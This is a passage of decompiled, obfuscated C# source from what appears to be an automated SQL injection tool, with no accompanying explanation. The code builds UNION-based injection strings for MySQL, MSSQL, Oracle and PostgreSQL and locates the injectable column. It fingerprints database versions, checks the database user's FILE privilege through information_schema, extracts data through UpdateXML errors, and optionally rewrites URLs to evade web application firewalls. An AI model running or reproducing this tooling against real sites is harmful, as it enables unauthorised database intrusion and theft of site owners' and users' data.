			while (true)
			{
				if (num <= int_7)
				{
					if (!string.IsNullOrEmpty(text))
					{
						text += ",";
					}
					if (Class54.smethod_9(DBType))
					{
						text += Class23.smethod_20(text2 + Conversions.ToString(num) + ".9");
					}
					else if (Class54.smethod_10(DBType))
					{
						text = text + "cast(" + Class23.smethod_20(text2 + Conversions.ToString(num) + ".9") + "+as+char)";
					}
					else if (Class54.smethod_11(DBType))
					{
						text += Class23.smethod_21(text2 + Conversions.ToString(num) + ".9", bool_0: false, "||", "chr");
					}
					else
					{
						if (!Class54.smethod_12(DBType))
						{
							break;
						}
						text += Class23.smethod_21(text2 + Conversions.ToString(num) + ".9", bool_0: false, "||", "chr");
					}
					num++;
					continue;
				}
				int num2 = Conversions.ToInteger(HTML_Work(4, string_8.Replace("[t]", text), text2));
				if (num2 > 0)
				{
					ResultUnion = "";
					text = "";
					for (int i = 1; i <= int_7; i++)
					{
						if (!string.IsNullOrEmpty(text))
						{
							text += ",";
						}
						text = ((i != num2) ? ((!Class54.smethod_11(DBType)) ? (text + Conversions.ToString(i)) : (text + "null")) : (text + "[t]"));
					}
					ResultUnion = string_8.Replace("[t]", text);
					bool flag;
					if ((flag = true) == Class54.smethod_9(DBType))
					{
						DBType = Types.MySQL_No_Error;
					}
					else if (flag == Class54.smethod_10(DBType))
					{
						DBType = Types.MSSQL_No_Error;
					}
					else if (flag == Class54.smethod_11(DBType))
					{
						DBType = Types.Oracle_No_Error;
					}
					else if (flag == Class54.smethod_12(DBType))
					{
						DBType = Types.PostgreSQL_No_Error;
					}
					if (num2 > 0)
					{
						CheckVersionNoCollactions(ResultUnion);
					}
					ResultUnionColumn = num2;
					return true;
				}
				return false;
			}
			throw new Exception("TryUnionBasead(" + string_8 + ", " + Conversions.ToString(int_7) + ")");
		}
	}

	private bool method_5(string string_8, int int_7, string string_9)
	{
		string text = "";
		checked
		{
			for (int i = 1; i <= int_7; i++)
			{
				if (!string.IsNullOrEmpty(text))
				{
					text += ",";
				}
				text += "null";
			}
			bool flag;
			if (flag = !HTML_CheckKeyword(string_8.Replace("[t]", text), string_9))
			{
				for (int j = 1; j <= int_7; j++)
				{
					text = "";
					for (int k = 1; k <= int_7; k++)
					{
						if (!string.IsNullOrEmpty(text))
						{
							text += ",";
						}
						text = ((j != k) ? (text + "null") : (text + "[t]"));
					}
					if (flag = CheckVersionNoCollactions(string_8.Replace("[t]", text)))
					{
						ResultUnion = string_8.Replace("[t]", text);
						ResultUnionColumn = j;
						break;
					}
				}
				if (flag)
				{
					bool flag2;
					if ((flag2 = true) == Class54.smethod_9(DBType))
					{
						DBType = Types.MySQL_No_Error;
					}
					else if (flag2 == Class54.smethod_10(DBType))
					{
						DBType = Types.MSSQL_No_Error;
					}
					else if (flag2 == Class54.smethod_11(DBType))
					{
						DBType = Types.Oracle_No_Error;
					}
					else if (flag2 == Class54.smethod_12(DBType))
					{
						DBType = Types.PostgreSQL_No_Error;
					}
				}
				else
				{
					bool_11 = true;
				}
			}
			return flag;
		}
	}

	private int method_6(string string_8, string string_9)
	{
		try
		{
			int num = string_8.ToLower().IndexOf(string_9.ToLower());
			if (num > 0)
			{
				string text = string_8.Substring(num);
				string text2 = text.Substring(string_9.Length, checked(text.IndexOf(".") - string_9.Length)).Trim();
				if (Versioned.IsNumeric(text2))
				{
					return Conversions.ToInteger(text2);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return -1;
	}

	private string method_7(string string_8)
	{
		string result = "";
		string[] array = new string[2];
		List<string>[] array2 = new List<string>[2];
		List<string> list = new List<string>();
		list.AddRange(Strings.Split(string_8, "/"));
		list.AddRange(Strings.Split(string_8, "&"));
		list.AddRange(Strings.Split(string_8, "="));
		onProgressEventHandler_0?.Invoke(this, "finding keyword", -1);
		int num = 0;
		do
		{
			string url = ((num == 0) ? string_8.Replace("[t]", "") : string_8.Replace("[t]", ExploitCode));
			array[num] = HTML_Load(url);
			array2[num] = new List<string>();
			if (!string.IsNullOrEmpty(array[num]))
			{
				array2[num].AddRange(Strings.Split(array[num].Trim()));
				if (num == 1)
				{
					if ((array2[0].Count == 0) | (array2[1].Count == 0))
					{
						return "";
					}
					List<string>[] array3 = new List<string>[2];
					if (array2[0].Count > array2[1].Count)
					{
						array3[0] = array2[0];
						array3[1] = array2[1];
					}
					else
					{
						array3[0] = array2[1];
						array3[1] = array2[0];
					}
					foreach (string item in array3[0])
					{
						if (string.IsNullOrEmpty(item) || item.Length <= 5 || item.Length >= 10 || array3[1].Contains(item))
						{
							continue;
						}
						bool flag = true;
						foreach (string item2 in list)
						{
							if (!string.IsNullOrEmpty(item2))
							{
								flag = !item.Contains(item2);
							}
							if (!flag)
							{
								break;
							}
						}
						if (flag)
						{
							result = item;
							if (item.Length > 5)
							{
								break;
							}
						}
					}
				}
				num = checked(num + 1);
				continue;
			}
			return result;
		}
		while (num <= 1);
		return result;
	}

	private bool method_8(string string_8)
	{
		List<string> list = new List<string>();
		list = GetInfo(string_8, "user()");
		if (list.Count == 1)
		{
			string[] array = list[0].Split('@');
			if (array.Length == 2)
			{
				string text = "'" + array[0] + "'@'" + array[1] + "'";
				list.Clear();
				list.Add("privilege_type");
				string sCustomQuery = "from information_schema.user_privileges where privilege_type like " + Class23.smethod_20("%file%") + " and grantee = " + Class23.smethod_20(text);
				switch (DBType)
				{
				case Types.MySQL_With_Error:
					string_8 = MySQLWithError.Dump(string_8, MySQLCollactions, MySQLErrorType.UpdateXML, bIFNULL: false, "", "", list, 0, 1, "", "", "", sCustomQuery);
					break;
				case Types.MySQL_No_Error:
					string_8 = MySQLNoError.Dump(string_8, MySQLCollactions, bHexEncoded: false, bIFNULL: false, "", "", list, 0, 1, "", "", "", sCustomQuery);
					break;
				}
				list = HTML_ParseHtmlData(string_8);
				return list.Count > 0;
			}
			return false;
		}
		return false;
	}

	private bool method_9(string string_8)
	{
		if (string_8.ToLower().Contains("union"))
		{
			_ = 1;
		}
		else
		{
			_ = 2;
		}
		List<string> list = new List<string>();
		bool flag;
		if ((flag = true) == Class54.smethod_9(DBType))
		{
			list = GetInfo(string_8, "version()");
		}
		else if (flag == Class54.smethod_10(DBType))
		{
			list = GetInfo(string_8, "@@version");
		}
		else if (flag == Class54.smethod_11(DBType))
		{
			list = GetInfo(string_8, "(select banner from v$version where banner like " + Class23.smethod_21("%Oracle%", bool_0: false, "||", "chr") + ")");
		}
		else if (flag == Class54.smethod_12(DBType))
		{
			list = GetInfo(string_8, "version()");
		}
		if (list.Count == 0)
		{
			return false;
		}
		Version = method_10(list[0]);
		return true;
	}

	private string method_10(string string_8)
	{
		bool flag;
		if ((flag = true) == Class54.smethod_9(DBType))
		{
			if (string_8.Contains("-"))
			{
				string_8 = Strings.Split(string_8, "-")[0];
			}
			else if (string_8.Contains("+"))
			{
				string_8 = Strings.Split(string_8, "+")[0];
			}
		}
		else if (flag == Class54.smethod_10(DBType))
		{
			if (string_8.Contains("Microsoft"))
			{
				string_8 = string_8.Replace("Microsoft", "");
			}
			if (string_8.Contains("Server "))
			{
				string_8 = string_8.Replace("Server ", "");
			}
			if (string_8.Contains("-"))
			{
				string_8 = Strings.Split(string_8, "-")[0];
			}
			if (string_8.Contains("("))
			{
				string_8 = Strings.Split(string_8, "(")[0];
			}
		}
		else if (flag == Class54.smethod_11(DBType))
		{
			if (string_8.Contains("Enterprise Edition Release "))
			{
				string_8 = Strings.Replace(string_8, "Enterprise Edition Release ", "");
			}
			if (string_8.Contains("Production"))
			{
				string_8 = Strings.Replace(string_8, "Production", "");
			}
			if (string_8.Contains("-"))
			{
				string_8 = Strings.Replace(string_8, "-", "");
			}
			if (string_8.Contains("Release"))
			{
				string_8 = Strings.Replace(string_8, "Release", "");
			}
			if (string_8.Contains("Database"))
			{
				string_8 = Strings.Replace(string_8, "Database", "");
			}
			if (string_8.Contains("Oracle"))
			{
				string_8 = Strings.Replace(string_8, "Oracle", "");
			}
		}
		else if (flag == Class54.smethod_12(DBType) && string_8.Contains(" on "))
		{
			string_8 = Strings.Split(string_8, " on ")[0];
		}
		if (string_8.Contains("  "))
		{
			string_8 = string_8.Replace("  ", " ");
		}
		return string_8.Trim();
	}

	private void method_11()
	{
		while (!RetyFailed && !(stopwatch_1.Elapsed.TotalMilliseconds > (double)checked(Delay * 2)) && !method_0())
		{
			Thread.Sleep(100);
			Application.DoEvents();
		}
	}

	public string HTML_Load(string url)
	{
		string text = Conversions.ToString(HTML_Work(0, url));
		if (text == null)
		{
			text = "";
		}
		return text;
	}

	private Types method_12(string string_8)
	{
		return (Types)Conversions.ToInteger(HTML_Work(1, string_8));
	}

	public bool HTML_CheckKeyword(string url, string Keyword)
	{
		return Conversions.ToBoolean(HTML_Work(2, url, Keyword));
	}

	public List<string> HTML_ParseHtmlData(string url)
	{
		List<string> list = new List<string>();
		string text = Conversions.ToString(HTML_Work(3, url));
		if (!string.IsNullOrEmpty(text))
		{
			list.Add(text);
		}
		return list;
	}

	public object HTML_Work(byte v, string url, object value = null)
	{
		if (Conversions.ToBoolean(Globals.GetObjectValue(Globals.GMain.chkAnalizeWAF)))
		{
			url = Class23.smethod_15(url);
		}
		int retry = Retry;
		object obj = default(object);
		for (int i = 0; i <= retry; i = checked(i + 1))
		{
			method_11();
			if (method_0())
			{
				break;
			}
			httpext_0.FollowRedirects = FollowRedirects;
			switch (v)
			{
			case 0:
				obj = httpext_0.QuickGet(url);
				break;
			case 1:
				obj = httpext_0.CheckSyntaxError(url);
				break;
			case 2:
				obj = httpext_0.CheckKeyword(url, Conversions.ToString(value));
				break;
			case 3:
				obj = httpext_0.ParseHtmlData(url, DBType);
				break;
			case 4:
				obj = httpext_0.TryUnionBasead(url, Conversions.ToString(value), DBType);
				if (Operators.ConditionalCompareObjectEqual(obj, -2, TextCompare: false))
				{
					obj = null;
				}
				break;
			}
			if (FollowRedirects)
			{
				WasRedirected = httpext_0.WasRedirected();
			}
			else
			{
				WasRedirected = false;
			}
			webServer_0 = (Globals.WebServer)checked((byte)httpext_0.WebServer());
			stopwatch_1 = Stopwatch.StartNew();
			httpext_0.Status();
			if (obj != null)
			{
				if (!(obj is bool) || httpext_0.ContextSize() != 0)
				{
					break;
				}
				continue;
			}
			if (httpext_0.Status() > 0)
			{
				break;
			}
			if (i >= Retry)
			{
				RetyFailed = true;
			}
		}
		return obj;
	}
}
